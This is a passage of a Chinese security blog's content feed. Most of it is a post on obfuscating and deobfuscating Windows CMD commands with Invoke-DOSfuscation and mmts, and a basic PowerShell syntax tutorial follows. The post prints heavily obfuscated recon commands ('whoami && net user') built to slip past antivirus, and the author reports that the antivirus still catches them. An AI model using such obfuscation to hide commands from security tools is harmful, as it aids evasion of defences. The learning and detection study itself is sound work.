<p><code>assoc /?</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">显示或修改文件扩展名关联</span><br><span class="line"></span><br><span class="line">ASSOC [.ext[&#x3D;[fileType]]]</span><br><span class="line"></span><br><span class="line">  .ext      指定跟文件类型关联的文件扩展名</span><br><span class="line">  fileType  指定跟文件扩展名关联的文件类型</span><br><span class="line"></span><br><span class="line">键入 ASSOC 而不带参数，显示当前文件关联。如果只用文件扩展</span><br><span class="line">名调用 ASSOC，则显示那个文件扩展名的当前文件关联。如果不为</span><br><span class="line">文件类型指定任何参数，命令会删除文件扩展名的关联。</span><br></pre></td></tr></table></figure>

<p><code>ftype /?</code> </p>
<p>ftype：显示或修改用在文件扩展名关联中的文件类型，指定一种类型的文件默认用哪个程序运行或打开。命令格式为<code> ftype [fileType[=[openCommandString]]</code></p>
<p><img src="/posts/bac18dc8/f1.png" alt="截图"></p>
<br>

<p><code>for /?</code>  使用方法挺详细的 就是感觉有点不好理解…</p>
<p><img src="/posts/bac18dc8/f2.png" alt="截图"></p>
<p>for 循环在混淆时是一种较为复杂的方式通常会使用  /F 和 /L 参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR &#x2F;L %variable IN (start,step,end) DO command [command-parameters]</span><br><span class="line"></span><br><span class="line">该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5)将产生序列12345，(5,-1,1)将产生序列(54321)</span><br><span class="line"></span><br><span class="line">FOR &#x2F;F [&quot;options&quot;] %variable IN (file-set) DO command [command-parameters]</span><br><span class="line">FOR &#x2F;F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command [command-parameters]</span><br><span class="line">FOR &#x2F;F [&quot;options&quot;] %variable IN (&#39;command&#39;) DO command [command-parameters]</span><br><span class="line"></span><br><span class="line">delims&#x3D;xxx  用xxx进行分割字符串</span><br><span class="line">delims&#x3D;f&#x3D; 用f与&#x3D; 进行分割字符串</span><br><span class="line">tokens&#x3D;x,y,m-n </span><br><span class="line">tokens&#x3D;2 选择分割后的第二段</span><br><span class="line">usebackq</span><br><span class="line"></span><br><span class="line">for &#x2F;f &quot; delims&#x3D;f&#x3D; tokens&#x3D;2&quot; %f IN ( &#39;assoc .cmd&#39; ) do %f</span><br><span class="line">assoc .cmd 返回结果为 .cmd&#x3D;cmdfile</span><br><span class="line">delims&#x3D;f&#x3D; 会使用f和&#x3D;进行分割  分成3部分 .cmd cmd file</span><br><span class="line">tokens&#x3D;2  会选择第二部分 即cmd </span><br><span class="line">所以该命令执行后会去调用cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FOR &#x2F;F &quot;usebackq delims&#x3D;&#x3D;&quot; %i IN (&#96;set&#96;) DO @echo %i</span><br><span class="line">会枚举当前环境中的环境变量名称</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="利用混淆工具"><a href="#利用混淆工具" class="headerlink" title="利用混淆工具"></a>利用混淆工具</h3><p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></p>
<p>需要powershell管理员权限下去运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br><span class="line">Import-Module .\Invoke-DOSfuscation.psd1</span><br><span class="line">Invoke-DOSfuscation</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>tutorial</code> 查看基本使用方法</li>
</ul>
<p><img src="/posts/bac18dc8/11.png" alt="截图"></p>
<ul>
<li>Set command [需要混淆的命令]  //设置需要混淆的命令   </li>
</ul>
<p><img src="/posts/bac18dc8/12.png" alt="截图"></p>
<ul>
<li>Set FINALBINARY [命令运行的环境]  //设置命令运行的环境</li>
</ul>
<p><img src="/posts/bac18dc8/13.png" alt="截图"></p>
<ul>
<li>payload  //加载混淆模块</li>
</ul>
<p><img src="/posts/bac18dc8/14.png" alt="截图"></p>
<ul>
<li><p>show //查看当前命令设置的参数详情</p>
<p><img src="/posts/bac18dc8/15.png"></p>
</li>
<li><p>test  //测试混淆后的命令</p>
</li>
</ul>
<br>

<h3 id="cmd命令去混淆"><a href="#cmd命令去混淆" class="headerlink" title="cmd命令去混淆"></a>cmd命令去混淆</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul>
<li>替换掉 ^ 转义字符</li>
<li>通过 = 和 % 的规则去查找混淆的变量</li>
<li>通过 set 查找混淆变量</li>
<li>通过 %:~m,n% 查找混淆变量</li>
<li>统一小写常用命令和程序名称</li>
</ul>
<h4 id="mmts"><a href="#mmts" class="headerlink" title="mmts"></a>mmts</h4><p>这里使用mmts简单试一下 项目地址 <a href="https://github.com/a232319779/mmts">https://github.com/a232319779/mmts</a></p>
<p>先通过反混淆工具生成一条命令 保存为1.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;C&quot;set zUG&#x3D;\System32\ ^^^| findstr calc\.exe&amp;&amp;set cF&#x3D;:&amp;&amp;set szG&#x3D;Windows&amp;&amp;set QK&#x3D;\&amp;&amp;set HhO&#x3D;dir&amp;&amp;set u6&#x3D; C&amp;&amp;call set uQ&#x3D;%HhO%%u6%%cF%%QK%%szG%%zUG%&amp;&amp;cmd &#x2F;C %uQ%&quot;</span><br></pre></td></tr></table></figure>

<p>然后再mmts下 <code>mmts-decmd 1.txt</code></p>
<p><img src="/posts/bac18dc8/16.png" alt="截图"></p>
<p>再去生成一个复杂点的混淆 <code>whoami &amp;&amp; net user</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f^o^R  ;   ,    ;  ,  ;   ,   ,   &#x2F;^F   ;   ;  ;  ;  &quot;      tokens&#x3D;   +2       delims&#x3D;H0lFu&quot;  ;   ,   ;   ,  ;  ;    %^V  ;   ;  ,   ,    ,  ^In    ,    ;  ;  ;  (   ,  ,    ,   ,    ;    ;   ,   &#39;   ,  ;    ,  ,    ;    ,   ;  ^^f^^t^^Y^^P^^E  ;   ;  ;    ;   ^|    ;   ,   ;    ;  ^^f^^iN^^D   ;   ;    ,    ;    ;  ,  ,  &quot;Cm&quot;   ;  ,   ,  ,  ;    ,  &#39;  ,   ;  ,   ;   )  ;  ,   ;   ;   ,   ^D^o   ;   ;  ,    %^V,     ;   ;  ;  ;  ,  ,   ;  9k467c^&#x2F;^v^@^E^O^f^ ^ ^    ;  ;   ;    ;  kwp3a&#x2F;^r       &quot;  ;  ;    ,   ,  ,  (       ,      ,    ,     ,     ,       (     ,    (^S^e^t ^  ^ ^*^_;&#x3D;^~^R^-^j^z^ri^2^S^U^&amp;e_^y^6^a^&gt;^s^aY^6vh^u^Z^d^L^+N^ ^#^k^6&#96;Ut^p ^4^c^H^e^,^jo^Y&#125;n^-^&#96;^5^9^_^ ^1^Z^)^, ^&amp;^]^2^;^e^t^^?^eO^&amp;^#^&amp;^,^K^Y^BN^^3%^D^I^w^ 1^l^H^3P^i~^f^b%;^m^(^f^o^@^)a^g^&#123;^c^s^K^o^_C^&#123;^E^&#96;^h^p^F^@^BAwp^Qd^B^?^ ^x^qs^zl^ ^Vq^&gt;^Y^j^|^f^&#123;^5S^Z^^O^)^6^?^\^ ^6^&lt;%^v^2\a^?^j^z^G^2^&amp;^W^S^9^a^3^&#96;^*^&gt;v^w^mj~#^t^(^ea^T^h^_^6^t^aB^)^A^X^s^j^b^D^(^W^y^\^Al^:&#123;^s^C^b^\5^@^\^M^C^XN^?^s^J^M^P^[^x^w^S^4^UCy^o^I^9^&#123;^2^S^d^T^w^_^&#96;^Xn^u^J^|r3^i~^x^&#123;^L^&amp;^w^[^r^vW^,^\^7^b^;^e^R^:^#^&#96;&#x3D;E^;^C^9^g^O^o~^ ^Z^v^&gt;^ ^A^r^Y^&#39;^m^$^[^iZ^&#x3D;^Bt^*^d) ; ; ; ; ) ; ; ; ; ; )&amp;       ;  ,    ;  ,   ,    ,  ;  ^f^o^R   ;   ;    ;    ;  ;  &#x2F;^L   ,  ,   ;    %^j  ;   ,  ,    ^In    ;    ,   ;  ,  (^  ^ ^ ^ ^2^9^3^   ^ ^ ^,^ ^ ^ ^;^ ^ ^ ^ , ^    ^ ^ ^;^ ^  ^,^ ^ ^ ^   ^ ; ^ ^ ^ ^ ^  ^,^   ^ ^ ^-^6 ^ ^   ^ ^ ^,^    ^+5^ ^ ^ ^ ^ ^ )   ,    ;    ;  ;   ,   ;  ;    ^D^o  ;   ,  ,    ;   ;    ,  ,    (       ,       (      ,    ;     ,       ;     ,      ;      ,      ;      ,    (      ,      (       ,     ;    ,     ;   ,   ;       ,     ;   ,     ;      ,    ;       ,     ;   ,       (     ,       ,   ,   ,    ,      ,   ,   (    ;   ,    ;  ,  ;    ;   ^S^Et        &#96;^&#123;^&#39;&#x3D;!&#96;^&#123;^&#39;!!^*^_;:~   %^j,      1!)       ,       ;     ,     ;       ,      ;     ,    ;    ,     )   ,     ,       ,     )       ,    ,   ,     ,       ,      ,       ,    )       ,     ;       ,     ;       ,      ;    ,    ;      ,      ;      ,     ;       ,       ;       ,     )     ,   ,   ,    ,      ,    )&amp;&amp;   ;    ;   ;  ,  ;    ^i^F  ,   ,    ,   ;    %^j  ;  ;    ;   ,    ^E^q^u   ,  ;  ;    ,   ^5   ,  ,    ;  (     ,     ,      ,     (     ,       ,    ,      (       ,   ;    ,      ;      ,       ;     ,       ;   ,   ;   ,      (   ,   ;    ,       ;       ,      ;       ,     ;       ,    (^e^C^h^O   ;   ,   ;    ;  !&#96;^&#123;^&#39;:^*^&#96;^&#123;&#39;!^&#x3D;!       |  ,  ,    ,   ;  ^F^O^r   ;   ,  ,   ;    &#x2F;^f   ;    ,    ;    &quot;^ ^ ^ ^ ^ ^ ^ t^ok^en^s&#x3D; ^ ^ ^ ^ ^ ^ ^+^2^ ^ ^ ^ ^de^li^m^s^&#x3D;^M^Hc^L^F^e&quot;   ,  ,    ,   ;   ,   %^D    ;   ,   ,   ^iN  ;   ;  ,    ;   ;    ;   ;   (    ,  ,   ,   ,   ,  ,   &#39;  ,   ,   ;   ,    ,   ,    ;    f^^^^T^^^^y^^^^Pe   ,   ;    ,   ;   ;   ,   ,  ^^^|  ,  ;  ,   ;   ,  ,   ^^^^F^^^^In^^^^D  ;   ,  ;    ;  &quot;Cm&quot;  ;   ,  ,   ;   ,  &#39;  ;  ,    ;    ;    ;   ,  )   ;   ;   ;    ^d^o    ,  ;  ;  %^D, )    ,      ,    )      ,    ,    )    ;     ;       ;    ;       ;   )      )   ;  ,  ;    ;    ;  ;    ;  &quot;</span><br></pre></td></tr></table></figure>

<p>这是使用reverse 的高级混淆，但是mmts也没用把他彻底解出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R  ;   ,    ;  ,  ;   ,   ,   &#x2F;F   ;   ;  ;  ;  &quot;      tokens&#x3D;   +2       delims&#x3D;H0lFu&quot;  ;   ,   ;   ,  ;  ;    %V  ;   ;  ,   ,    ,  In    ,    ;  ;  ;  (   ,  ,    ,   ,    ;    ;   ,   &#39;   ,  ;    ,  ,    ;    ,   ;  ftYPE  ;   ;  ;    ;   |    ;   ,   ;    ;  fiND   ;   ;    ,    ;    ;  ,  ,  &quot;Cm&quot;   ;  ,   ,  ,  ;    ,  &#39;  ,   ;  ,   ;   )  ;  ,   ;   ;   ,   Do   ;   ;  ,    %V,     ;   ;  ;  ;  ,  ,   ;  9k467c&#x2F;v@EOf      ;  ;   ;    ;  kwp3a&#x2F;r       &quot;  ;  ;    ,   ,  ,  (       ,      ,    ,     ,     ,       (     ,    (e_y6a&gt;saY6vhuZdL+N #k6&#96;Utp 4cHe,joY&#125;n-&#96;59_ 1Z), &amp;]2;et?eO&amp;#&amp;,KYBN3%DIw 1lH3Pi~fb%;m(fo@)ag&#123;csKo_C&#123;E&#96;hpF@BAwpQdB? xqszl Vq&gt;Yj|f&#123;5SZO)6?\ 6&lt;%v2\a?jzG2&amp;WS9a3&#96;*&gt;vwmj~#t(eaTh_6taB)AXsjbD(Wy\Al:&#123;sCb\5@\MCXN?sJMP[xwS4UCyoI9&#123;2SdTw_&#96;XnuJ|r3i~x&#123;L&amp;w[rvW,\7b;eR:#&#96;&#x3D;E;C9gOo~ Zv&gt; ArY&#39;m$[iZ&#x3D;Bt*d) ; ; ; ; ) ; ; ; ; ; )&amp;       ;  ,    ;  ,   ,    ,  ;  foR   ;   ;    ;    ;  ;  &#x2F;L   ,  ,   ;    %j  ;   ,  ,    In    ;    ,   ;  ,  (     293     ,   ;    ,       ;   ,       ;       ,     -6       ,    +5      )   ,    ;    ;  ;   ,   ;  ;    Do  ;   ,  ,    ;   ;    ,  ,    (       ,       (      ,    ;     ,       ;     ,      ;      ,      ;      ,    (      ,      (       ,     ;    ,     ;   ,   ;       ,     ;   ,     ;      ,    ;       ,     ;   ,       (     ,       ,   ,   ,    ,      ,   ,   (    ;   ,    ;  ,  ;    ;      ;    ;   ;  ,  ;    iF  ,   ,    ,   ;    %j  ;  ;    ;   ,    Equ   ,  ;  ;    ,   5   ,  ,    ;  (     ,     ,      ,     (     ,       ,    ,      (       ,   ;    ,      ;      ,       ;     ,       ;   ,   ;   ,      (   ,   ;    ,       ;       ,      ;       ,     ;       ,    (echo   ;   ,   ;    ;  !&#96;&#123;&#39;:*&#96;&#123;&#39;!&#x3D;!       |  ,  ,    ,   ;  FOr   ;   ,  ,   ;    &#x2F;f   ;    ,    ;    &quot;       tokens&#x3D;       +2    delims&#x3D;MHcLFe&quot;   ,  ,    ,   ;   ,   %D    ;   ,   ,   iN  ;   ;  ,    ;   ;    ;   ;   (    ,  ,   ,   ,   ,  ,   &#39;  ,   ,   ;   ,    ,   ,    ;    fTyPe   ,   ;    ,   ;   ;   ,   ,  |  ,  ;  ,   ;   ,  ,   FInD  ;   ,  ;    ;  &quot;Cm&quot;  ;   ,  ,   ;   ,  &#39;  ;  ,    ;    ;    ;   ,  )   ;   ;   ;    do    ,  ;  ;  %D, )    ,      ,    )      ,    ,    )    ;     ;       ;    ;       ;   )      )   ;  ,  ;    ;    ;  ;    ;  &quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/17.png" alt="截图"></p>
<p>左侧为混淆后，右侧为使用mmts去混淆后的结果</p>
<p>直接使用ps脚本的 test 功能 火绒都会报错，很显然单单这一技术现在已经不可行，这里主要是学习一下思路</p>
<p><img src="/posts/bac18dc8/18.png" alt="截图"></p>
<p><img src="/posts/bac18dc8/19.png" alt="截图"></p>
<br>



<p>虽然现在来说可能没法去绕过杀软了（大多杀软都是从底层防御），但是还算是一种思路</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://www.anquanke.com/post/id/260422">https://www.anquanke.com/post/id/260422</a><br><a href="https://www.cnblogs.com/nongchaoer/p/13054822.html">https://www.cnblogs.com/nongchaoer/p/13054822.html</a><br><a href="https://www.t00ls.cc/articles-54517.html">https://www.t00ls.cc/articles-54517.html</a><br><a href="https://cloud.tencent.com/developer/article/1633973">https://cloud.tencent.com/developer/article/1633973</a><br><a href="https://ddvvmmzz.github.io/Windows-CMD%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%B7%B7%E6%B7%86">https://ddvvmmzz.github.io/Windows-CMD%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%B7%B7%E6%B7%86</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>spring_RCE_CVE-2022-22947复现</title>
    <url>/posts/178b79d4/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Dll劫持学习-01</title>
    <url>/posts/e1659c9c/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Powershell基础学习</title>
    <url>/posts/359bf983/</url>
    <content><![CDATA[<h3 id="Powershell基础"><a href="#Powershell基础" class="headerlink" title="Powershell基础"></a>Powershell基础</h3><h4 id="0x00-执行策略-amp-版本信息"><a href="#0x00-执行策略-amp-版本信息" class="headerlink" title="0x00 执行策略&amp; 版本信息"></a>0x00 执行策略&amp; 版本信息</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span></span><br><span class="line"></span><br><span class="line">Restricted：脚本不能运行</span><br><span class="line">RemoteSigned：在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）。</span><br><span class="line">AllSigned：仅当前脚本受信任的发布者签名时才能运行。</span><br><span class="line">Unrestricted：允许所有脚本运行</span><br></pre></td></tr></table></figure>

<ul>
<li>1.0 - windows server 2008</li>
<li>2.0 - windows server 2008 r2、windows 7</li>
<li>3.0 - windows server 2012、windows 8</li>
<li>4.0 - windows server 2012 r2、windows 8.1</li>
<li>5.0 - windows 10</li>
<li>5.1 - windows server 2016</li>
</ul>
<br>

<h4 id="0x01-基本语法"><a href="#0x01-基本语法" class="headerlink" title="0x01 基本语法"></a>0x01 基本语法</h4><ul>
<li>对缩进不敏感</li>
<li>不强制分号</li>
<li>保留字、命令大小写区分</li>
<li>以{}作为代码块</li>
</ul>
<h4 id="0x02-变量"><a href="#0x02-变量" class="headerlink" title="0x02.变量"></a>0x02.变量</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># 全局变量</span></span><br><span class="line"><span class="variable">$global:a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># 脚本变量</span></span><br><span class="line"><span class="variable">$script:a</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出变量a</span></span><br><span class="line"><span class="built_in">Write-host</span> <span class="variable">$a</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># 删除变量</span></span><br><span class="line"><span class="built_in">clear-variable</span></span><br><span class="line"><span class="comment"># 查看a的类型</span></span><br><span class="line"><span class="variable">$a</span>.GetType()</span><br></pre></td></tr></table></figure>

<h4 id="0x03-对象集合"><a href="#0x03-对象集合" class="headerlink" title="0x03 对象集合"></a>0x03 对象集合</h4><h5 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建和初始化数组</span><br><span class="line">$arr &#x3D; 1,2,3,4,5</span><br><span class="line">$arr2 &#x3D; 1..5</span><br><span class="line"></span><br><span class="line">$arr[0]</span><br><span class="line">$arr2[2..5]</span><br><span class="line"></span><br><span class="line"># 数组大小</span><br><span class="line">$arr.Length</span><br><span class="line"></span><br><span class="line">#数组操作</span><br><span class="line">$arr[2] &#x3D; 8</span><br><span class="line"># 将元素添加到$arr中 </span><br><span class="line">$arr +&#x3D; 6</span><br><span class="line"></span><br><span class="line"># 初始化一个空数组</span><br><span class="line">$arr &#x3D; @()</span><br><span class="line"></span><br><span class="line"># 从数组中删除元素</span><br><span class="line">$arr &#x3D; 1..5</span><br><span class="line">$arr &#x3D; ($arr[1], $arr[2], $arr[3])</span><br></pre></td></tr></table></figure>

<br>

<h5 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;&lt;key1&gt; = &lt;value1&gt; ; &lt; key2&gt; = &lt;value2&gt; ; ..... ; &lt; keyN&gt; = &lt;valueN&gt;;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;a = <span class="number">1</span>; a2 = <span class="number">2</span> ;&#125;</span><br><span class="line"><span class="variable">$dict</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name                           Value                                                                      </span></span><br><span class="line"><span class="comment"># ----                           -----                                                                      </span></span><br><span class="line"><span class="comment"># a                              1                                                                          </span></span><br><span class="line"><span class="comment"># a2                             2   </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.Keys</span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># a2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.values</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示哈希表的键/值对总数</span></span><br><span class="line"><span class="variable">$dict</span>.count</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.</span><br><span class="line"><span class="variable">$dict</span>.Add(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="variable">$dict</span>.Remove(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hash</span> = <span class="selector-tag">@</span>&#123; ID = <span class="number">1</span>; Shape = <span class="string">&quot;Square&quot;</span>; Color = <span class="string">&quot;Blue&quot;</span>&#125;</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable keys&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.keys</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable values&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.values</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get ID&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;ID&quot;</span>]</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get Shape&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Number</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;Updated&quot;</span>] = <span class="string">&quot;Now&quot;</span></span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Add(<span class="string">&quot;Created&quot;</span>,<span class="string">&quot;Now&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Remove key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Remove(<span class="string">&quot;Updated&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;sort by key&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.GetEnumerator() | <span class="built_in">Sort-Object</span> <span class="literal">-Property</span> key</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">Print all hashtable keys</span><br><span class="line">Color</span><br><span class="line">Shape</span><br><span class="line">ID</span><br><span class="line">Print all hashtable values</span><br><span class="line">Blue</span><br><span class="line">Square</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get ID</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get Shape</span><br><span class="line">print Size</span><br><span class="line"><span class="number">3</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">5</span></span><br><span class="line">Remove key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="built_in">sort</span> by key</span><br><span class="line">Name Value</span><br><span class="line">---- -----</span><br><span class="line">Color Blue</span><br><span class="line">Created Now</span><br><span class="line">ID <span class="number">1</span></span><br><span class="line">Shape Square</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x04-运算符"><a href="#0x04-运算符" class="headerlink" title="0x04  运算符"></a>0x04  运算符</h4><h5 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h5><ul>
<li>-eq        等于</li>
<li>-ne        不等于</li>
<li>-gt        大于</li>
<li>-ge        大于等于</li>
<li>-lt        小于</li>
<li>-le        小于等于</li>
</ul>
<h5 id="匹配运算符"><a href="#匹配运算符" class="headerlink" title="匹配运算符"></a>匹配运算符</h5><ul>
<li>-like</li>
<li>-notlike</li>
<li>-match</li>
<li>-notmatch</li>
</ul>
<h5 id="包含运算符"><a href="#包含运算符" class="headerlink" title="包含运算符"></a>包含运算符</h5><ul>
<li>-contains</li>
<li>-nocontains</li>
<li>-match</li>
<li>-notmatch</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;abc&quot;</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;a*&quot;</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;a??&quot;</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-like</span> <span class="variable">$b</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-like</span> <span class="variable">$c</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line">----------------------</span><br><span class="line">----------------------</span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">1</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-contains</span> <span class="variable">$b</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="variable">$b</span> <span class="operator">-contains</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># False</span></span><br></pre></td></tr></table></figure>

<h4 id="0x05-控制流程"><a href="#0x05-控制流程" class="headerlink" title="0x05 控制流程"></a>0x05 控制流程</h4><h5 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h5><ul>
<li>if else</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> <span class="operator">-eq</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;aaa&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$a</span> <span class="operator">-gt</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;bbb&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;ccc&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ccc</span></span><br></pre></td></tr></table></figure>

<ul>
<li>switch</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$day</span>=<span class="number">5</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$day</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">1</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期一&quot;</span>&#125;</span><br><span class="line">  <span class="number">2</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期二&quot;</span>&#125;</span><br><span class="line">  <span class="number">3</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期三&quot;</span>&#125;</span><br><span class="line">  <span class="number">4</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期四&quot;</span>&#125;</span><br><span class="line">  <span class="number">5</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期五&quot;</span>&#125;</span><br><span class="line">  <span class="number">6</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期六&quot;</span>&#125;</span><br><span class="line">  <span class="number">7</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;今天是星期日&quot;</span>&#125;</span><br><span class="line">  default&#123;<span class="built_in">echo</span> <span class="string">&quot;请输入1-7&quot;</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># 今天是星期五</span></span><br></pre></td></tr></table></figure>

<br>

<h5 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h5><ul>
<li>for</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">10</span>; <span class="variable">$i</span>=<span class="variable">$i</span>+<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>foreach</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$i</span> <span class="keyword">in</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>while</li>
</ul>
